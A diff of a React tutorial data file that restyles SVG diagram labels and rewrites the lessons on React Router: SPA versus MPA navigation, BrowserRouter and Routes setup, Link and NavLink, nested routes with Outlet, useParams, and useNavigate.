-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">HTTPONLY COOKIE APPROACH</text>
+                    <rect x="15" y="15" width="204" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="117" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">HTTPONLY COOKIE APPROACH</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Browser-Enforced (Production Standard)</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -7453,6 +8085,10 @@ const handleLogin = async (credentials) =&gt; {
         }
       ]
     },
+
+    /* ═══════════════════════════════════════════════════════════════
+       TOPIC 38
+       ═══════════════════════════════════════════════════════════════ */
     {
       id: 'react-38',
       number: 38,
@@ -7591,8 +8227,8 @@ export default App</code></pre>
                   <!-- Step 1: User Click -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="70" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="50" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STEP 01</text>
+                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STEP 01</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">Click 'Next'</text>
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                     <text x="25" y="94" class="svg-mono-xs">setIndex(index + 1)</text>
@@ -7603,8 +8239,8 @@ export default App</code></pre>
                   <!-- Step 2: Reactive Effect -->
                   <g transform="translate(245, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="70" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="50" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STEP 02</text>
+                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STEP 02</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">Effect Fires</text>
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                     <text x="25" y="94" class="svg-mono-xs">useEffect([index])</text>
@@ -7615,8 +8251,8 @@ export default App</code></pre>
                   <!-- Step 3: Axios Query -->
                   <g transform="translate(465, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="70" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="50" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STEP 03</text>
+                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STEP 03</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">Axios Stream</text>
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                     <text x="25" y="94" class="svg-mono-xs">GET ?page=2&amp;limit=15</text>
@@ -7627,8 +8263,8 @@ export default App</code></pre>
                   <!-- Step 4: DOM Grid Paint -->
                   <g transform="translate(675, 20)">
                     <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="70" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="50" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STEP 04</text>
+                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">STEP 04</text>
                     <text x="90" y="56" text-anchor="middle" class="svg-title">Grid Paint</text>
                     <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                     <text x="25" y="94" class="svg-mono-xs">setUserData(data)</text>
@@ -7673,8 +8309,8 @@ export default App</code></pre>
                   <!-- Discrete Pagination -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">DISCRETE PAGINATION</text>
+                    <rect x="15" y="15" width="167" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="98.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">DISCRETE PAGINATION</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Page-by-Page State Replacement</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -7706,33 +8342,37 @@ export default App</code></pre>
     }
 ,
     {
-      id: 'react-39',
-      number: 39,
-      shortLabel: 'React 39',
-      title: 'React Router DOM Basics & Single Page Applications (SPA)',
-      summary: 'Architecting modern Single Page Applications (SPAs): How client-side routing eliminates full-page browser reloads, setting up BrowserRouter, Routes, and Route matching, and why &lt;Link&gt; replaces the traditional HTML &lt;a&gt; tag.',
-      subtopicLabels: [
-        '39.1 SPA Architecture',
-        '39.2 BrowserRouter & Routes',
-        '39.3 &lt;Link&gt; vs. &lt;a&gt; Tag'
-      ],
+      id: "react-39-router-dom-spa-basics",
+      number: "39",
+      shortLabel: "React Router DOM & SPAs",
+      title: "React Router DOM Basics & Single Page Applications (SPA)",
+      summary: "Architecting modern Single Page Applications (SPAs): How client-side routing eliminates full-page browser reloads, HTML5 History API mechanics, setting up BrowserRouter, Routes, and wildcard 404 handlers.",
+      subtopicLabels: ["39.1 Traditional MPAs vs. React SPAs", "39.2 Core Architecture: BrowserRouter, Routes & Route", "39.3 The Fatal &lt;a href&gt; Reload Trap vs. &lt;Link&gt;"],
       diagramCount: 2,
       sections: [
         {
-          id: 'react-39-1',
-          num: '39.1',
-          title: 'What Is a Single Page Application (SPA)?',
+          num: "39.1",
+          title: "Traditional Multi-Page Applications (MPA) vs. Single Page Applications (SPA)",
           content: `
             <p>
-              In traditional <strong>Multi-Page Applications (MPAs)</strong>, every user navigation link triggers a complete round-trip network request to a web server. The browser discards its entire in-memory JavaScript heap, tears down the existing DOM, flashes a blank white screen, and parses an entirely new HTML document.
+              In traditional web architecture (PHP, Django, standard HTML), clicking a navigation link (<code>&lt;a href="/about"&gt;</code>) triggers a full roundtrip to the web server:
             </p>
-            <p>
-              In a <strong>Single Page Application (SPA)</strong> built with React, the browser loads a single lightweight HTML shell (<code>index.html</code>) once. As the user navigates, a client-side router intercepts URL changes, updates the browser's <code>window.history</code> stack, and surgically mounts/unmounts components inside the existing Virtual DOM <strong>without reloading the web page</strong>.
-            </p>
-            <p>
-              <strong>React Router DOM</strong> is the enterprise standard library for implementing declarative, component-based client-side routing in React:
-            </p>
-            <pre class="notes-code-block"><code>npm install react-router-dom</code></pre>
+
+            <ul class="notes-bullet-list">
+              <li><strong>The Traditional MPA Bottleneck:</strong>
+                <ul class="notes-sub-list">
+                  <li>The browser initiates a full HTTP GET request, tears down the existing DOM, flushes all JavaScript memory, and downloads a brand-new HTML document.</li>
+                  <li>The screen flashes white, stylesheets and scripts re-download, and user scroll position resets.</li>
+                </ul>
+              </li>
+              <li><strong>The Single Page Application (SPA) Revolution:</strong>
+                <ul class="notes-sub-list">
+                  <li>In a React SPA, the browser loads a single HTML shell (<code>index.html</code>) once.</li>
+                  <li>When a user navigates between pages, <strong>React Router DOM</strong> intercepts the URL change using the browser's <strong>HTML5 History API</strong> (<code>pushState</code> and <code>popState</code>).</li>
+                  <li>Instead of requesting a new document from the server, React unmounts the old page component and mounts the new page component directly in the existing DOM—instantaneous, buttery smooth navigation with zero page reloads!</li>
+                </ul>
+              </li>
+            </ul>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -7744,8 +8384,8 @@ export default App</code></pre>
                   <!-- MPA -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">TRADITIONAL MPA (&lt;a href&gt;)</text>
+                    <rect x="15" y="15" width="219" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.2"/>
+                    <text x="124.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">TRADITIONAL MPA (&lt;a href&gt;)</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Full Document Teardown</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -7758,8 +8398,8 @@ export default App</code></pre>
                   <!-- SPA -->
                   <g transform="translate(455, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">REACT SPA (&lt;Link to&gt;)</text>
+                    <rect x="15" y="15" width="182" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="106" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">REACT SPA (&lt;Link to&gt;)</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Client-Side Virtual DOM Swap</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -7774,54 +8414,58 @@ export default App</code></pre>
           `
         },
         {
-          id: 'react-39-2',
-          num: '39.2',
-          title: 'Core Setup: BrowserRouter, Routes & Wildcard 404 Routes',
+          num: "39.2",
+          title: "Core Setup: BrowserRouter, Routes & Wildcard 404 Catch-All",
           content: `
             <p>
-              Configuring client-side routing requires three foundational components working in concert:
+              To enable client-side routing in a React Vite application, we install <strong>React Router DOM</strong>:
             </p>
-            <ol>
-              <li><strong><code>&lt;BrowserRouter&gt;</code>:</strong> The root context provider that connects your React application to the browser's HTML5 History API. It must wrap the entire component tree in <code>main.jsx</code>.</li>
-              <li><strong><code>&lt;Routes&gt;</code>:</strong> The smart container placed inside <code>App.jsx</code> that inspects the current URL pathname and renders the best single matching child <code>&lt;Route&gt;</code>.</li>
-              <li><strong><code>&lt;Route&gt;</code>:</strong> Defines the mapping between a specific URL path (e.g., <code>path="/product"</code>) and the component element to mount (<code>element={&lt;Product /&gt;}</code>).</li>
-              <li><strong>Wildcard Route (<code>path="*"</code>):</strong> Catches all unmatched paths and serves a custom 404 Not Found fallback view.</li>
-            </ol>
 
-            <pre class="notes-code-block"><code>// 1. main.jsx (Root Provider Initialization)
-import { createRoot } from 'react-dom/client'
-import { BrowserRouter } from 'react-router-dom'
-import App from './App.jsx'
+            <pre class="notes-code-block"><code>npm install react-router-dom</code></pre>
 
-createRoot(document.getElementById('root')).render(
-  // BrowserRouter synchronizes UI with browser History API
-  &lt;BrowserRouter&gt;
-    &lt;App /&gt;
-  &lt;/BrowserRouter&gt;
-)</code></pre>
+            <ul class="notes-bullet-list">
+              <li><strong>Step 1: Wrap App with <code>&lt;BrowserRouter&gt;</code> in <code>main.jsx</code>:</strong>
+                <pre class="notes-code-block"><code>import React from 'react';
+import ReactDOM from 'react-dom/client';
+import { BrowserRouter } from 'react-router-dom';
+import App from './App.jsx';
 
-            <pre class="notes-code-block"><code>// 2. App.jsx (Route Matching Table)
-import { Route, Routes } from 'react-router-dom'
-import Home from './pages/Home'
-import About from './pages/About'
-import Product from './pages/Product'
-import NotFound from './pages/NotFound'
+// BrowserRouter connects your entire component tree to browser history
+ReactDOM.createRoot(document.getElementById('root')).render(
+  &lt;React.StrictMode&gt;
+    &lt;BrowserRouter&gt;
+      &lt;App /&gt;
+    &lt;/BrowserRouter&gt;
+  &lt;/React.StrictMode&gt;
+);</code></pre>
+              </li>
+              <li><strong>Step 2: Declare Routes in <code>App.jsx</code>:</strong>
+                <pre class="notes-code-block"><code>import React from 'react';
+import { Routes, Route } from 'react-router-dom';
+import Home from './pages/Home';
+import About from './pages/About';
+import Product from './pages/Product';
+import NotFound from './pages/NotFound';
 
-const App = () => {
+function App() {
   return (
-    &lt;div className="app-container"&gt;
+    &lt;div className="min-h-screen bg-canvas text-text-primary"&gt;
+      {/* Routes acts as a switch container, rendering the first matching Route */}
       &lt;Routes&gt;
         &lt;Route path="/" element={&lt;Home /&gt;} /&gt;
         &lt;Route path="/about" element={&lt;About /&gt;} /&gt;
         &lt;Route path="/product" element={&lt;Product /&gt;} /&gt;
-        {/* Wildcard path catches any unregistered route */}
+        
+        {/* Wildcard * catch-all renders custom 404 for any unmatched URL */}
         &lt;Route path="*" element={&lt;NotFound /&gt;} /&gt;
       &lt;/Routes&gt;
     &lt;/div&gt;
-  )
+  );
 }
 
-export default App</code></pre>
+export default App;</code></pre>
+              </li>
+            </ul>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -7872,97 +8516,142 @@ export default App</code></pre>
           `
         },
         {
-          id: 'react-39-3',
-          num: '39.3',
-          title: '&lt;Link&gt; vs. HTML &lt;a&gt; Tag (Preserving SPA State)',
+          num: "39.3",
+          title: "The Fatal &lt;a href&gt; Reload Trap vs. &lt;Link to&gt; & &lt;NavLink&gt;",
           content: `
             <p>
-              A critical pitfall for developers migrating from vanilla HTML is using standard anchor tags:
+              The most critical rule of client-side routing: <strong>Never use standard HTML <code>&lt;a href="..."&gt;</code> tags for internal navigation in React!</strong>
             </p>
-            <ul>
-              <li><strong>The Anchor Problem:</strong> <code>&lt;a href="/about"&gt;</code> instructs the browser to bypass React Router and initiate a standard HTTP navigation, triggering a full page reload and wiping out all active state.</li>
-              <li><strong>The Link Solution:</strong> The <code>&lt;Link to="/about"&gt;</code> component renders an accessible anchor tag under the hood, but automatically calls <code>event.preventDefault()</code> on user click. It then uses the History API to push the new URL seamlessly into the address bar.</li>
+
+            <ul class="notes-bullet-list">
+              <li><strong>Why <code>&lt;a href&gt;</code> Destroys React SPAs:</strong>
+                <ul class="notes-sub-list">
+                  <li>In native HTML, clicking <code>&lt;a href="/about"&gt;</code> commands the browser to initiate a full document reload.</li>
+                  <li>All in-memory React state (e.g. <code>useState</code> values, user session tokens, active timers, form drafts) is instantly flushed down the drain!</li>
+                </ul>
+              </li>
+              <li><strong>The Solution — <code>&lt;Link to&gt;</code> & <code>&lt;NavLink to&gt;</code>:</strong>
+                <ul class="notes-sub-list">
+                  <li><code>&lt;Link to="/about"&gt;</code> cancels the browser's default document reload, updates the URL bar via <code>history.pushState()</code>, and tells React Router to swap page components in memory.</li>
+                  <li><strong><code>&lt;NavLink&gt;</code>:</strong> Specialized variant for navigation bars. Automatically injects an <code>active</code> class or gives you an <code>isActive</code> boolean prop to highlight the currently active tab!</li>
+                </ul>
+              </li>
             </ul>
 
-            <pre class="notes-code-block"><code>// components/Navbar.jsx
-import { Link } from 'react-router-dom'
+            <pre class="notes-code-block"><code>import React from 'react';
+import { NavLink } from 'react-router-dom';
 
-const Navbar = () => {
+function Navbar() {
   return (
-    &lt;nav className="flex gap-4 p-4 border-b"&gt;
-      {/* Use Link + 'to' to preserve React state without reloading */}
-      &lt;Link to="/" className="hover:underline"&gt;Home&lt;/Link&gt;
-      &lt;Link to="/about" className="hover:underline"&gt;About&lt;/Link&gt;
-      &lt;Link to="/product" className="hover:underline"&gt;Product&lt;/Link&gt;
+    &lt;nav className="flex gap-6 p-4 border-b bg-surface"&gt;
+      {/* NavLink automatically exposes isActive state */}
+      &lt;NavLink 
+        to="/" 
+        className={({ isActive }) => 
+          isActive ? 'text-emerald-600 font-bold border-b-2 border-emerald-600' : 'text-text-muted hover:text-text-primary'
+        }
+      &gt;
+        Home
+      &lt;/NavLink&gt;
+
+      &lt;NavLink 
+        to="/about" 
+        className={({ isActive }) => 
+          isActive ? 'text-emerald-600 font-bold border-b-2 border-emerald-600' : 'text-text-muted hover:text-text-primary'
+        }
+      &gt;
+        About
+      &lt;/NavLink&gt;
+
+      &lt;NavLink 
+        to="/product" 
+        className={({ isActive }) => 
+          isActive ? 'text-emerald-600 font-bold border-b-2 border-emerald-600' : 'text-text-muted hover:text-text-primary'
+        }
+      &gt;
+        Products
+      &lt;/NavLink&gt;
     &lt;/nav&gt;
-  )
+  );
 }
 
-export default Navbar</code></pre>
+export default Navbar;</code></pre>
           `
         }
       ]
     },
+
+    /* ═══════════════════════════════════════════════════════════════
+       TOPIC 40
+       ═══════════════════════════════════════════════════════════════ */
     {
-      id: 'react-40',
-      number: 40,
-      shortLabel: 'React 40',
-      title: 'Advanced Routing (Nested, Dynamic & Programmatic)',
-      summary: 'Mastering production routing patterns in React Router DOM: Building sub-page layouts with Nested Routes and &lt;Outlet /&gt;, reading dynamic URL segments via useParams(), and redirecting imperatively with useNavigate().',
-      subtopicLabels: [
-        '40.1 Nested Routes & &lt;Outlet /&gt;',
-        '40.2 Dynamic Routes & useParams',
-        '40.3 useNavigate Hook'
-      ],
+      id: "react-40-advanced-routing-nested-dynamic",
+      number: "40",
+      shortLabel: "Advanced Routing & Layouts",
+      title: "Advanced Routing (Nested, Dynamic & Programmatic)",
+      summary: "Mastering production routing patterns in React Router DOM: Building sub-page layouts with Nested Routes and &lt;Outlet /&gt;, reading dynamic URL parameters via useParams(), and redirecting imperatively with useNavigate().",
+      subtopicLabels: ["40.1 Nested Routes & the &lt;Outlet /&gt; Component", "40.2 Dynamic Routes & useParams()", "40.3 Programmatic Navigation with useNavigate()"],
       diagramCount: 2,
       sections: [
         {
-          id: 'react-40-1',
-          num: '40.1',
-          title: 'Nested Routes & the &lt;Outlet /&gt; Component',
+          num: "40.1",
+          title: "Nested Routes & The &lt;Outlet /&gt; Layout Architecture",
           content: `
             <p>
-              Enterprise web applications frequently have sections that share a common layout while rendering sub-pages internally (e.g., an eCommerce product catalog with persistent category filters showing <code>/product/men</code> and <code>/product/women</code>).
+              In enterprise web applications (such as dashboards, admin panels, or e-commerce suites), sub-pages frequently share a persistent parent shell—such as a side navigation bar, header, or search bar—that must stay mounted while only the inner content region swaps.
             </p>
-            <p>
-              In React Router DOM, this is handled through <strong>Nested Routes</strong>:
-            </p>
-            <ul>
-              <li><strong>Relative Child Paths:</strong> Child routes nested inside a parent <code>&lt;Route&gt;</code> must have relative paths (omitting the leading slash). For example, <code>path="men"</code> inside <code>path="/product"</code> resolves automatically to <code>/product/men</code>.</li>
-              <li><strong>The <code>&lt;Outlet /&gt;</code> Slot:</strong> The parent component (<code>Product.jsx</code>) renders <code>&lt;Outlet /&gt;</code> where the matched child route should appear. When navigating between <code>/product/men</code> and <code>/product/women</code>, the parent component remains mounted and never re-renders, while only the inner child swaps out.</li>
+
+            <ul class="notes-bullet-list">
+              <li><strong>The Power of Nested Routes:</strong>
+                <ul class="notes-sub-list">
+                  <li>In React Router DOM, you can nest <code>&lt;Route&gt;</code> elements inside a parent <code>&lt;Route&gt;</code>.</li>
+                  <li><strong>The <code>&lt;Outlet /&gt;</code> Component:</strong> Inside the parent component, place <code>&lt;Outlet /&gt;</code> where you want the child route components to appear. Think of <code>&lt;Outlet /&gt;</code> as a placeholder or window frame where matching child routes render!</li>
+                </ul>
+              </li>
             </ul>
 
-            <pre class="notes-code-block"><code>// App.jsx (Nested Route Definition)
-&lt;Routes&gt;
-  &lt;Route path="/product" element={&lt;Product /&gt;}&gt;
-    {/* Child routes inherit parent path -> /product/men &amp; /product/women */}
-    &lt;Route path="men" element={&lt;Men /&gt;} /&gt;
-    &lt;Route path="women" element={&lt;Women /&gt;} /&gt;
-  &lt;/Route&gt;
-&lt;/Routes&gt;</code></pre>
+            <pre class="notes-code-block"><code>// App.jsx — Nested Route Configuration:
+import { Routes, Route } from 'react-router-dom';
+import ProductLayout from './pages/ProductLayout';
+import MensClothing from './pages/MensClothing';
+import WomensClothing from './pages/WomensClothing';
 
-            <pre class="notes-code-block"><code>// pages/Product.jsx (Parent Shell with Outlet)
-import { Link, Outlet } from 'react-router-dom'
-
-const Product = () => {
+function App() {
   return (
-    &lt;div className="product-layout"&gt;
-      &lt;h1&gt;Product Catalog&lt;/h1&gt;
-      {/* Persistent sub-navigation */}
-      &lt;nav className="subnav flex gap-4 my-4"&gt;
-        &lt;Link to="/product/men"&gt;Men's Collection&lt;/Link&gt;
-        &lt;Link to="/product/women"&gt;Women's Collection&lt;/Link&gt;
-      &lt;/nav&gt;
+    &lt;Routes&gt;
+      {/* Parent route renders ProductLayout shell */}
+      &lt;Route path="/product" element={&lt;ProductLayout /&gt;}&gt;
+        {/* Child routes render inside ProductLayout's &lt;Outlet /&gt; */}
+        &lt;Route path="mens" element={&lt;MensClothing /&gt;} /&gt;
+        &lt;Route path="womens" element={&lt;WomensClothing /&gt;} /&gt;
+      &lt;/Route&gt;
+    &lt;/Routes&gt;
+  );
+}</code></pre>
 
-      {/* Outlet marks the exact slot where child routes mount */}
-      &lt;div className="child-view border p-4 rounded"&gt;
+            <pre class="notes-code-block"><code>// pages/ProductLayout.jsx:
+import { Outlet, Link } from 'react-router-dom';
+
+function ProductLayout() {
+  return (
+    &lt;div className="p-6"&gt;
+      &lt;h2 className="text-2xl font-bold mb-4"&gt;Product Catalog Hub&lt;/h2&gt;
+      
+      {/* Shared sub-navigation menu */}
+      &lt;div className="flex gap-4 border-b pb-3 mb-6"&gt;
+        &lt;Link to="/product/mens" className="font-semibold text-emerald-600"&gt;Men's Section&lt;/Link&gt;
+        &lt;Link to="/product/womens" className="font-semibold text-emerald-600"&gt;Women's Section&lt;/Link&gt;
+      &lt;/div&gt;
+
+      {/* &lt;Outlet /&gt; renders MensClothing or WomensClothing dynamically! */}
+      &lt;div className="bg-card p-6 border rounded-xl"&gt;
         &lt;Outlet /&gt;
       &lt;/div&gt;
     &lt;/div&gt;
-  )
+  );
 }
 
-export default Product</code></pre>
+export default ProductLayout;</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -7974,8 +8663,8 @@ export default Product</code></pre>
                   <!-- Parent Shell -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="150" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="90" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PARENT SHELL: /product</text>
+                    <rect x="15" y="15" width="189" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="109.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PARENT SHELL: /product</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Persistent Layout Frame</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -8004,90 +8693,92 @@ export default Product</code></pre>
           `
         },
         {
-          id: 'react-40-2',
-          num: '40.2',
-          title: 'Dynamic Routes & useParams()',
+          num: "40.2",
+          title: "Dynamic URL Parameters & The useParams() Hook",
           content: `
             <p>
-              When dozens of detail pages share an identical design template (e.g., <code>/courses/frontend</code>, <code>/courses/backend</code>, <code>/courses/react</code>), creating static routes for each is anti-pattern.
-            </p>
-            <p>
-              Instead, define a <strong>Dynamic Parameter</strong> segment prefixed with a colon (<code>:id</code>) in the route path, and extract that variable inside the component using the <strong><code>useParams()</code></strong> hook:
+              In real-world applications, you cannot hardcode a route for every product or user (e.g. <code>/user/1</code>, <code>/user/2</code>... <code>/user/100000</code>). Instead, we declare <strong>Dynamic Routes</strong> with colon parameters:
             </p>
 
-            <pre class="notes-code-block"><code>// 1. App.jsx: Defining the parameter token
-&lt;Route path="/courses/:id" element={&lt;CourseDetail /&gt;} /&gt;</code></pre>
+            <ul class="notes-bullet-list">
+              <li><strong>Declaring Dynamic Parameters:</strong>
+                <br><code>&lt;Route path="/user/:username" element={&lt;UserProfile /&gt;} /&gt;</code>
+                <br>The colon <code>:username</code> tells React Router: <em>"Treat this segment of the URL as a dynamic variable named username."</em>
+              </li>
+              <li><strong>Extracting Parameters with <code>useParams()</code>:</strong>
+                <ul class="notes-sub-list">
+                  <li>Inside the rendered component, call <code>const { username } = useParams();</code>.</li>
+                  <li>React Router extracts the string value directly from the browser's active URL bar! You can immediately use this parameter to fetch data from an API.</li>
+                </ul>
+              </li>
+            </ul>
 
-            <pre class="notes-code-block"><code>// 2. pages/CourseDetail.jsx: Consuming dynamic parameters
-import { useParams } from 'react-router-dom'
+            <pre class="notes-code-block"><code>import React, { useEffect, useState } from 'react';
+import { useParams } from 'react-router-dom';
+import axios from 'axios';
 
-const CourseDetail = () => {
-  // Extracts URL segment parameters into a key-value dictionary
-  // When visiting /courses/frontend -> params = { id: 'frontend' }
-  const params = useParams()
+function UserProfile() {
+  // Extract dynamic segment from URL (e.g. /user/sarthak &rarr; username = 'sarthak')
+  const { username } = useParams();
+  const [profileData, setProfileData] = useState(null);
+
+  useEffect(() => {
+    // Fetch profile whenever username parameter in URL changes
+    axios.get('https://api.github.com/users/' + username)
+      .then(res => setProfileData(res.data))
+      .catch(err => console.error('Failed to load profile:', err));
+  }, [username]); // Re-fetch if URL changes to another user
+
+  if (!profileData) return &lt;div className="p-6"&gt;Loading user @{username}...&lt;/div&gt;;
 
   return (
-    &lt;div className="p-6"&gt;
-      &lt;h1 className="text-2xl font-bold capitalize"&gt;
-        {params.id} Course Overview
-      &lt;/h1&gt;
-      &lt;p&gt;Active route parameter: &lt;code&gt;{params.id}&lt;/code&gt;&lt;/p&gt;
+    &lt;div className="p-6 max-w-sm mx-auto border rounded-xl bg-card shadow-sm text-center"&gt;
+      &lt;img src={profileData.avatar_url} alt={username} className="w-24 h-24 rounded-full mx-auto" /&gt;
+      &lt;h3 className="text-xl font-bold mt-3"&gt;{profileData.name}&lt;/h3&gt;
+      &lt;p className="text-text-muted text-sm"&gt;@{username}&lt;/p&gt;
+      &lt;p className="text-sm mt-2"&gt;{profileData.bio}&lt;/p&gt;
     &lt;/div&gt;
-  )
+  );
 }
 
-export default CourseDetail</code></pre>
+export default UserProfile;</code></pre>
           `
         },
         {
-          id: 'react-40-3',
-          num: '40.3',
-          title: 'Programmatic Navigation with useNavigate()',
+          num: "40.3",
+          title: "Programmatic Navigation With the useNavigate() Hook",
           content: `
             <p>
-              While declarative <code>&lt;Link&gt;</code> elements handle standard user clicks, asynchronous workflows often require triggering navigation <strong>imperatively inside JavaScript functions</strong>:
+              While <code>&lt;Link&gt;</code> handles user-initiated clicks, you often need to redirect the user <strong>imperatively in JavaScript code</strong>—such as redirecting to the dashboard after a successful login, navigating to the payment screen after order checkout, or moving back in history.
             </p>
-            <ul>
-              <li>Redirecting a user to <code>/dashboard</code> immediately upon successful login authentication.</li>
-              <li>Pushing the user to <code>/order-confirmation</code> after Stripe payment completes.</li>
-              <li>Implementing custom "Back" or "Forward" history controls.</li>
+
+            <ul class="notes-bullet-list">
+              <li><strong>The <code>useNavigate()</code> Hook:</strong>
+                <pre class="notes-code-block"><code>import { useNavigate } from 'react-router-dom';
+
+function LoginForm() {
+  const navigate = useNavigate();
+
+  const handleLogin = async (e) => {
+    e.preventDefault();
+    const isSuccess = await authenticateUser();
+
+    if (isSuccess) {
+      // 1. Standard forward navigation:
+      navigate('/dashboard');
+
+      // 2. Replace history entry (user cannot hit Back to return to login screen):
+      // navigate('/dashboard', { replace: true });
+
+      // 3. Relative back navigation (identical to browser Back button):
+      // navigate(-1);
+    }
+  };
+
+  return &lt;form onSubmit={handleLogin}&gt;...&lt;/form&gt;;
+}</code></pre>
+              </li>
             </ul>
-            <p>
-              The <strong><code>useNavigate()</code></strong> hook returns a dispatch function that executes these programmatic transitions:
-            </p>
-
-            <pre class="notes-code-block"><code>// pages/About.jsx
-import { useNavigate } from 'react-router-dom'
-
-const About = () => {
-  const navigate = useNavigate()
-
-  const handleReturnHome = () => {
-    // Perform cleanup or telemetry logging here...
-    navigate('/') // Imperative redirect to root
-  }
-
-  return (
-    &lt;div className="p-6 space-y-4"&gt;
-      &lt;h1&gt;About Engineering Portal&lt;/h1&gt;
